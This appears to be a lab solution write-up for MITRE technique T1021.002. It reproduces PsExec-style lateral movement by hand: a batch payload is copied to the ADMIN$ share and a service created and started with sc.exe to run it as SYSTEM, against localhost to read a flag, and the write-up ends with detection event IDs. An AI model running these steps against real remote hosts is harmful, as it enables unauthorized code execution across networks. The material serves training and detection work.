# T1021.002 – SMB PsExec-style Lateral Movement | Solution
**Difficulty:** Intermediate | **OS:** Windows | **MITRE:** T1021.002

## Background
PsExec achieves lateral movement by: copying a service binary to ADMIN$ share,
creating a service via RPC/SCM, starting it, communicating over IPC$.
We replicate this manually.

## Step 1 – Create Payload
```cmd
echo @echo off > C:\payload.bat
echo type C:\Windows\System32\flag_T1021_002b.txt > C:\Users\Public\flag_psexec.txt >> C:\payload.bat
```

## Step 2 – Copy to Remote via ADMIN$
```cmd
copy C:\payload.bat \\localhost\ADMIN$\payload.bat
```

## Step 3 – Create & Start Remote Service
```cmd
sc \\localhost create RemoteExecSvc binpath= "cmd.exe /c C:\Windows\payload.bat"
sc \\localhost start RemoteExecSvc
```

## Step 4 – Retrieve Flag & Cleanup
```cmd
type C:\Users\Public\flag_psexec.txt
REM Cleanup:
sc \\localhost stop RemoteExecSvc
sc \\localhost delete RemoteExecSvc
del \\localhost\ADMIN$\payload.bat
```

## Why It Works
```
ADMIN$  → C:\Windows  (mapped via ADMIN$ share)
sc.exe  → SCM (Service Control Manager) via RPC over port 445/SMB
Service → Runs as SYSTEM
```

## Detection
- **Event ID 7045** — Service installed on remote host
- **Event ID 4624/4648** — Network logon to ADMIN$
- Monitor ADMIN$ file writes from remote IPs
